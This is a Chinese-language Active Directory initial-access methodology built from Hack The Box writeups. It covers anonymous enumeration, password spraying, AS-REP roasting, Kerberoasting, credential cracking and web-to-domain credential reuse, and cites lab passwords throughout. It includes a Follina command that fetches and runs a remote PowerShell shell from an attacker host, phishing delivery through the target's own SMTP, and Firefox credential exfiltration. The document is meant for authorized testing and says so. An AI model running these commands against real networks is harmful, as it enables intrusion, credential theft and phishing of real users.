# AD 域渗透·初始访问方法论（零凭据起步到域内立足）

> 来源：用户博客 20+ 篇 HTB AD writeup 系列沉淀（Active/Forest/Sauna/Monteverde/Support/Timelapse/Blackfield/Intelligence/Rebound/Search/StreamIO/APT/Mantis 等）。触发场景：目标暴露 AD 特征端口簇（53/88/135/389/445/464/3268）、获得疑似域凭据、或 Web 立足后发现域环境。
> **仅限授权测试**：命令逐字摘自 writeup 原文（逐条标注来源）；真实项目执行前过 §8 红线与 SKILL.md Phase 0。

---

## 决策流程

```
端口簇 53/88/135/389/445/464/3268 → 判定域控，进入 AD 流程
   ↓ §1 零凭据信息收集（匿名 SMB/RPC/LDAP/nxc + IOXIDResolver IPv6）
       产出：域名/域 SID/用户名字典/共享文件 → §3 文档情报并行
   ↓ §2 用户名构造与喷洒（变形矩阵 → GetNPUsers oracle/kerbrute → 用户名=密码）
   ↓ 命中凭据 → §4 AS-REP Roast / Kerberoasting → hashcat → nxc 逐服务验证
   → 有 WinRM 即 evil-winrm 立足 = 初始访问完成
   并行：§5 Web→AD 桥接；§6 Follina+SMTP；票据报错先 §7 对时
```

## 0. Kerberos 认证机制速览（全部技巧的原理骨架）

KDC 运行在域控上 = AS（验证身份）+ TGS（为服务发票）；TGT 是"已认证"票根；SPN 唯一标识主机上的服务（来源：Tools-Kerberos 认证机制）。

**认证五步**：AS-REQ（携密码哈希加密的时间戳=预认证）→ AS-REP（KDC 解密匹配则返 TGT）→ TGS-REQ（持 TGT 请求服务票据）→ TGS-REP（发布**用服务账户密码哈希加密**的票根）→ AP-REQ（服务用自己的哈希解密授权）。

**初始访问相关的三个机制**：

1. **AS-REP Roasting**：账户设 `DONT_REQ_PREAUTH` 时 KDC 跳过预认证直接回 AS-REP，其中一段用密码派生密钥加密——等于 KDC 主动下发可离线爆破的密文（GetNPUsers 即此）。
2. **Kerberoasting**：任意拿到有效 TGT 的域用户（哪怕最低权限）可申请任意 SPN 的服务票；票内一段用**服务账号 NTLM hash** 加密，KDC 不校验访问权、目标服务不留痕。前提：有效域凭据 + 存在注册 SPN 的**用户账户**（非机器账户）。
3. **Golden Ticket**（后续阶段索引）：TGT 均由 krbtgt hash 加密，拿到即可伪造任意身份 TGT=域万能钥匙。

**爆破成本**：RC4 票据一次 MD4 派生密钥、无 salt；AES 的密钥派生要 PBKDF2-HMAC-SHA1 多轮迭代且带 salt——RC4（`$krb5asrep$23$` 类）离线爆破快得多（来源：Tools-Kerberos 认证机制）。

> **数值勘误**：原文写「AES 一次试密码要 1096 轮 HMAC-SHA1」；RFC 3962 规定 Kerberos AES string-to-key 的默认迭代数为 **4096**，原文疑为笔误。数量级结论（AES 远比 RC4 贵、防御侧应强制 AES）不变；引用具体数值以 4096 为准。

## 1. 零凭据信息收集

### 1.1 判定域控

端口簇 **53/88/135/139/389/445/464/593/636/3268/3269/9389** 全开 → 域控（来源：HTB-Active/Forest/Sauna/Support）。端口提取一行流（来源：HTB-Active）：

```bash
grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
```

拿到域名先写 hosts（来源：HTB-Sauna）：

```bash
sudo bash -c 'echo "10.129.22.120 egotistical-bank.local" >> /etc/hosts'
```

### 1.2 匿名枚举渠道表

| 渠道 | 命令 | 产出/判读 |
|---|---|---|
| SMB 匿名列共享 | `smbmap -H active.htb`（HTB-Active） | READ ONLY 共享即匿名可读 |
| smbmap 被拒时 | `smbclient -L 10.129.230.181 -N`（HTB-Support） | smbmap denied ≠ 死路，smbclient 匿名常仍可列 |
| 递归拉共享 | `smbclient //active.htb/Replication -N` → `recurse ON`、`prompt OFF`、`mget *`（HTB-Active） | 拉回 SYSVOL 副本找 GPP |
| RPC 空会话 | `rpcclient -U '' -N 10.129.229.17` 交互内 `lsaquery`（HTB-Blackfield） | 其余匿名命令被拒仍给 Domain Name+SID |
| RID 循环爆用户 | `impacket-lookupsid anonymous@10.129.229.17 20000 \| tee Lookupsid_result.txt`（HTB-Blackfield） | RID 500 起逐个爆出用户/组 |
| lookupsid 提用户名 | `grep SidType Lookupsid_result.txt \| awk -F '\' '{print $2}' \| awk -F '(' '{print $1}' \| tee Directory/users.txt`（HTB-Blackfield） | 产出 users.txt 喂 GetNPUsers |
| LDAP 匿名定根域 | `ldapsearch -x -H ldap://10.129.95.210 -s base namingcontexts`（HTB-Forest） | 拿 `DC=htb,DC=local` 根 DN |
| LDAP 匿名列用户 | `ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb,DC=local" "(objectClass=user)" sAMAccountName description userAccountControl memberOf`（Tools-LDAP） | HealthMailbox*/SM_* 是 Exchange 噪音 |
| 一站式 | `enum4linux-ng htb.local \| tee enum4linux_scan.txt`（HTB-Forest） | 用户/组/密码策略一把梭 |
| nxc 空会话 | `nxc smb 10.129.229.239 -u 'enil' -p '' --shares`（HTB-Outdated） | 直出 signing/SMBv1/域名/Null Auth |

**RID 速判**（Tools-Impacket 套件）：500=Administrator、501=Guest、502=krbtgt、512=Domain Admins。

**匿名 RPC 因目标而异**：Monteverde `sudo rpcclient -U '' -N 10.129.228.111 -c 'enumdomusers'` 直接吐全量用户（HTB-Monteverde）；Search 匿名 RPC 全 `NT_STATUS_CONNECTION_DISCONNECTED`（HTB-Search）；Blackfield 仅 lsaquery——三种都试。

### 1.3 IOXIDResolver IPv6 透视（IPv4 收窄时的盲区）

IPv4 只暴露 80/135 时，RPC IOXIDResolver 接口免认证泄露网卡 IPv6，IPv6 侧常全开（来源：HTB-APT）：

```bash
./IOXIDResolver.py -t 10.129.96.60        # 输出 Address: dead:beef::8581:ea2c:ca5e:aa12 等
sudo nmap -6 --min-rate 10000 -p- dead:beef::8581:ea2c:ca5e:aa12
```

一次暴露 53/88/389/445/3268/5985/9389 全部 AD 服务。**教训**：IPv6 喂 kerbrute 前必须写 `/etc/hosts`（`IPv6 域名`），否则 KDC 88 端口 UDP/TCP 全 `i/o timeout`。

### 1.4 匿名共享经典收益：GPP 密码

匿名可读 Replication/SYSVOL 时找 `Policies\{GUID}\MACHINE\Preferences\Groups\Groups.xml` 内 `cpassword="..."`（来源：HTB-Active）：

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

解出即有效域凭据，直接跳 §4。共享文件分诊：与官网可下载的 putty/7zip 对比，非公开自研工具（如 UserInfo.exe）优先逆向（HTB-Support）。

## 2. 无凭据用户名构造与喷洒

### 2.1 姓名→用户名变形矩阵

Web 团队页/邮件签名/图片人名是唯一起点时全变形再验证（HTB-Sauna，Fergus Smith）：

```
fsmith / FSmith / Fsmith / smithf
fergus.smith / Fergus.Smith / fergussmith
f.smith / F.Smith / smith.f
fergus / smith（单名各一行，大小写各一行）
```

Search 版本（John Smith，13 变体）：`john.smith / jsmith / johns / johnsmith / smithjohn / smith.john / smithj / j.smith / john_s / john_smith / john-smith / smith / john`（HTB-Search）。

### 2.2 GetNPUsers 当"用户名存在性 oracle"

零凭据下 GetNPUsers 的报错本身就是枚举信号（来源：HTB-Sauna）：

```bash
GetNPUsers.py -no-pass -dc-ip 10.129.22.120 egotistical-bank.local/ -usersfile users.txt
```

| 输出（Sauna 实测） | 含义 |
|---|---|
| `KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)` | 用户不存在 |
| `[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set` | **用户存在**但需预认证 |
| `KDC_ERR_CLIENT_REVOKED` | 存在但被禁用 |
| 直接吐 `$krb5asrep$23$...` | 存在且免预认证，hash 到手 |

一次探测同时验证"用户名存在 + 拿可爆破 hash"。kerbrute 同理（HTB-APT）：

```bash
./kerbrute userenum -d htb.local --dc htb.local user_list.txt
```

### 2.3 喷洒

**用户名=密码**（同一文件作两个字典，`--no-bruteforce` 保证一一对应不组合爆炸，来源：HTB-Monteverde）：

```bash
nxc smb 10.129.228.111 -u Users/users -p Users/users --continue-on-success --no-bruteforce
```

**已知一个密码喷全员**（HTB-Intelligence）：

```bash
./kerbrute_linux_amd64 passwordspray -d intelligence.htb --dc 10.129.95.154 Users/users 'NewIntelligenceCorpUser9876'
```

**喷洒判读两条铁律**：
1. **组名假成功**：`sudo nxc smb rebound.htb -u Users.txt -p '1GR8t@$$4u' -d rebound.htb --continue-on-success` 输出 `[+] rebound.htb\Domain Admins:1GR8t@$$4u (Guest)`——带 `(Guest)` 且对象是组名的全是假成功，只信真实用户名且无 Guest 标记的行（HTB-Rebound）。
2. **时钟偏差下的有效登录**：kerbrute 报 `[+] VALID LOGIN WITH ERROR: ... (Clock skew is too great)` 仍是有效登录（HTB-Intelligence）。

**信号**：`AAD_987d7f2f57d2` 格式账号 = Azure AD Connect 同步账号（安装时自动生成），指向 Azure AD Sync 提权路径（HTB-Monteverde）。

## 3. 文档/文件情报

### 3.1 PDF 双通道（来源：HTB-Intelligence）

日期规律文件名爆破全集（发现 `2020-01-01-upload.pdf` 后按日历枚举）：

```bash
for m in $(seq -w 1 12); do for d in $(seq -w 1 31);do f="2020-$m-$d-upload.pdf"; code=$(curl -s -o "$f" -w '%{http_code}' "http://intelligence.htb/documents/$f"); if [ "$code" = "200" ]; then echo "[+] $f";else rm -f "$f";fi;done;done
```

文本通道（批量转文本+关键词捞默认密码）：

```bash
for f in *.pdf; do pdftotext "$f" "${f%.pdf}.txt" 2>/dev/null; done
grep -inE 'password|pass|default|initial|temp|credential|login' *.txt
```

元数据通道（Creator 字段即 Windows 用户名，一次拿 30 个）：

```bash
for f in *.pdf; do pdfinfo "$f" 2>/dev/null | grep -i '^Creator:'; done | sed 's/^Creator:[[:space:]]*//' | sort -u
```

### 3.2 其他文件类型

| 类型 | 操作 | 来源 |
|---|---|---|
| FTP/共享 PDF | `exiftool *.pdf` 出用户名 | HTB-PivotAPI |
| docx 附件 | `exiftool New_Starter_CheckList_v7.docx` → Creator"FCastle"/Description"Created on Acute-PC01"/Last Modified By Daniel = 真实姓名+主机名+用户名规律 | HTB-Acute |
| xlsx | `unzip Phishing_Attempt.xlsx -d extracted` → `cat sharedStrings.xml`——`xl/sharedStrings.xml` 明文存全部单元格字符串，实测是全员"姓名:密码"表 | HTB-Search |
| Web 图片 | `wget http://search.htb/images/slide_2.jpg` 后**放大人工审查**，实测便签写着 'Send password to Hope Sharp IsolationIsKey?' | HTB-Search |
| SMB 共享配置 | azure.xml 序列化字段 `<S N="Password">` 明文凭据 | HTB-Monteverde |

读出的凭据先验证再深入（命令见 §5.2）。

## 4. AS-REP Roast 与 Kerberoasting

### 4.1 AS-REP Roast 全链

§1/§2 产出的 users.txt 直接喂入：

```bash
impacket-GetNPUsers -no-pass -dc-ip 10.129.229.17 BLACKFIELD.local/ -usersfile Directory/users.txt    # HTB-Blackfield
impacket-GetNPUsers htb.local/ -usersfile users.txt -format hashcat -outputfile GetNPUsers_out.txt -dc-ip 10.129.95.210    # HTB-Forest
hashcat -m 18200 Directory/support_hash.txt /usr/share/wordlists/rockyou.txt    # HTB-Blackfield
```

**教训**：hashcat 报 `Separator unmatched` → `cat -A` 查文件——终端折行把 hash 截成两行；单用户重定向重取（HTB-Blackfield）：

```bash
impacket-GetNPUsers -no-pass -dc-ip 10.129.229.17 BLACKFIELD.local/ -usersfile Directory/support_user.txt > Directory/support_hash.txt
```

### 4.2 Kerberoasting

拿到任意域凭据后（前提见 §0）：

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.18.244 -request    # HTB-Active
impacket-GetUserSPNs search.htb/hope.sharp:'IsolationIsKey?' -dc-ip 10.129.229.57 -request    # HTB-Search
hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt    # HTB-Active
```

**零凭据 Kerberoast**（存在免预认证账户时全程无密码，用该账户当跳板，来源：HTB-Rebound）：

```bash
sudo impacket-GetUserSPNs -no-preauth jjones -usersfile Users.txt -dc-ip dc01.rebound.htb rebound.htb/
```

**排除法**：GetUserSPNs 输出 No entries（无用户账户注册 SPN）→ 转 BloodHound 找 ACL 路径，不要死磕（HTB-PivotAPI）。

### 4.3 hashcat 模式表

| hash 类型 | 模式 | 场景 |
|---|---|---|
| AS-REP（`$krb5asrep$23$`） | `-m 18200` | GetNPUsers 产物 |
| TGS（Kerberoast） | `-m 13100` | GetUserSPNs 产物 |
| NetNTLMv2 | `-m 5600` | Responder/中继捕获 |

### 4.4 破解后：验证→定路径

凭据到手**先逐服务验证再定登录方式**（有 WinRM 才 evil-winrm；SMB✓/WinRM✗ 继续挖文件共享）：

```bash
crackmapexec winrm 10.129.229.17 -u support -p '#00^BlackKnight'    # HTB-Blackfield
crackmapexec smb 10.129.229.17 -u support -p '#00^BlackKnight'      # HTB-Blackfield
nxc smb 10.129.229.17 -u support -p '#00^BlackKnight' --shares      # 每拿新凭据重跑重查共享权限
evil-winrm -i egotistical-bank.local -u fsmith -p 'Thestrokes23'    # HTB-Sauna
```

## 5. Web→AD 桥接：凭据滚雪球

### 5.1 Web 层凭据来源清单（来源：HTB-StreamIO/Search 同一模式）

| 来源 | 实例 |
|---|---|
| SQLi 拖库后 MD5 破解 | `hashcat -m 0 user_creds /usr/share/wordlists/rockyou.txt --user --show` |
| webroot 捞连接串 | `dir -recurse *.php \| select-string -pattern "database"` |
| 桌面/共享 xlsx、Web 图片便签、azure.xml 配置 | §3.2 |
| 浏览器凭据库 | Firefox key4.db + logins.json |

### 5.2 逐协议验证链

Web 库账密**先打 Web 登录再逐协议试 SMB/WinRM/LDAP**——Web 独立凭据库常被管理员复用进域（HTB-StreamIO）。Web 侧 hydra `-C`（用户:密码合表一一对应）：

```bash
cat user-pass | cut -d: -f1,3 | tee userspass
hydra -C userspass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
```

域侧逐协议（HTB-Search）：

```bash
nxc smb search.htb --shares -u hope.sharp -p 'IsolationIsKey?'
nxc ldap search.htb -u hope.sharp -p 'IsolationIsKey?'
nxc winrm search.htb -u hope.sharp -p 'IsolationIsKey?'
```

### 5.3 落地后 15 分钟清单（webshell/RCE 落地即执行，来源：HTB-StreamIO）

1. **webroot 捞 DB 连接串**：`dir -recurse *.php | select-string -pattern "database"` → `db_admin:B1@hx31234567890`
2. **本地 MSSQL 查库**：`where.exe sqlcmd.exe` → `sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"` → 拖出域凭据 nikk37
3. **新凭据对打 Web 登录**（§5.2 hydra -C）+ nxc 逐协议
4. **浏览器凭据库**：winPEAS 提示 `Firefox credentials file exists at C:\Users\<u>\AppData\Roaming\Mozilla\Firefox\Profiles\...` → 外带解密
5. **有 WinRM 即收官**：`evil-winrm -u nikk37 -p 'get_dem_girls2@yahoo.com' -i streamio.htb`

Firefox 外带（匿名 SMB 不能 net use，须带凭据）：

```bash
sudo impacket-smbserver Enil . -smb2support    # 靶机：net use \\kali\Enil /u:user pass + copy
python3 firepwd.py -d ../firefoxs              # 解出 slack 子域第二组域凭据
```

**教训**：SQLi 拖出的凭据 cme 打 SMB 不通用不代表无用——同批 hydra -C 打 Web 登录命中 yoshihide；Firefox profile 有多个（default/default-release）逐个翻。

## 6. 特殊初始访问向量：Follina + 借目标 SMTP 投递

匿名共享发现 `emails` 文件（`cat emails` → `itsupport@outdated.htb`）拿到内部邮箱后，用 Follina（CVE-2022-30190）生成恶意 docx 并**借目标自身 25 端口投递**，无需外部邮件设施（来源：HTB-Outdated）：

```bash
python3 follina.py -t docx -m command -u 10.10.16.151 -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.151:8000/shell.ps1')"
```

生成 `clickme.docx`+`exploit.html` 并自动在 80 端口托管。投递（来源：HTB-Outdated）：

```bash
sendEmail -f "enil@outdated.htb" -t "itsupport@outdated.htb" -u "Test" -m "http://10.10.16.151/exploit" -s 10.129.229.239:25    # 失败：530 SMTP authentication is required
sendEmail -f "enil@enil.htb" -t "itsupport@outdated.htb" -u "Web app" -m "http://10.10.16.151/exploit.html" -s 10.129.229.239:25    # 成功
```

**教训**：伪造目标域内发件人被拒（530 要认证）时，换任意域名发件人反而投递成功。

配套要点：
- **SMTP 手工侦察**（Tools-SMTP）：`telnet <ip> 25` → `HELO test` → `MAIL FROM: <enil@admin.com>` → `RCPT TO: <nico@megabank.com>`，`250 OK` vs `550 Unknown user` 差分即用户枚举。
- **Follina 落地特征**：shell 出现在 `C:\Users\<u>\AppData\Local\Temp\SDIAG_<guid>`；凭据外带用带凭据 smbserver：`sudo impacket-smbserver -smb2support -username enil -password enil share .`（HTB-Outdated）。
- **纪律**：sendEmail 属钓鱼投递工具，仅授权明确允许实发时用（挂 SKILL.md Phase 4）。

## 7. 时钟偏差（KRB_AP_ERR_SKEW）

**成因**：Kerberos 默认 ±5 分钟容忍，超出 DC 直接拒票据（Tools-时钟偏差）。nmap 脚本输出 `_clock-skew: mean: 7h59m21s` 即预警信号（HTB-Outdated/StreamIO）。

**对时两法**（Tools-时钟偏差）：

```bash
sudo net time set -S 10.10.10.10    # SMB 对时，走 TCP 445/139
sudo ntpdate rebound.htb            # NTP 对时，走 UDP 123，DC 大概率开放；实测步进 25174.985837 秒——此量级下域内票据必败
```

**bloodhound-python 的 NTLM 回退**（Kerberos 拿不到 TGT 自动降级，采集仍完成但日志可见根因，来源：HTB-StreamIO）：

```
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

**决策点**：任何票据被拒（KRB_AP_ERR_SKEW）/NTLM 异常/kerbrute 报 Clock skew，第一动作是与 DC 对时，不要先怀疑凭据错误。

## 8. 红线对齐段（必读）

1. **仅限授权测试**：喷洒、钓鱼投递、凭据爆破均直接作用于真实用户账号——只允许在书面授权范围内执行；HTB 是靶机场景，真实项目逐条核对授权后再动。
2. **触发 skill Phase 0 授权流程**：用户首次给出目标即进入 Phase 0；如有限定测试范围须先说出，未说出默认授权范围。域内进一步测试回 Phase 0 补充 in-scope 确认。
3. **Phase 4 默认禁止**：RCE 落地、持久化、横向移动、凭据批量导出。sendEmail/Follina 投递、NTDS/secretsdump 类操作、喷洒命中后的横向均属受限行为，授权写明"可执行代码/可提权/可横向"才可执行。
4. **喷洒纪律**：有锁定风险——限速、命中即停、`--no-bruteforce` 防组合爆炸（与 unauth-access.md `-t 4 -W 2` 纪律同源）。
5. **证据与反幻觉**：命令逐字摘自 writeup 原文并标注来源；无证据只写"疑似/待验证"禁止写"已确认/已利用"；报错按原文判读（§2.3 两条铁律）。
